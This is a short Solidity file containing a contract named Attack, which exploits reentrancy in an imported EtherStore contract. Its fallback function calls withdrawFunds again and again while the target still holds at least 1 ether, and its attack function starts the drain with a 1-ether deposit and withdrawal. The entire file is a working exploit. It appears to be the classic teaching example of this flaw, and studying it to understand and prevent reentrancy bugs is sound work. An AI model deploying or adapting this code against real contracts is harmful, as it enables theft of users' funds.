//SPDX-License-Identifier: Unlicense
pragma solidity ^0.4.26;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function() payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.depositFunds.value(1 ether)();
        etherStore.withdrawFunds(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
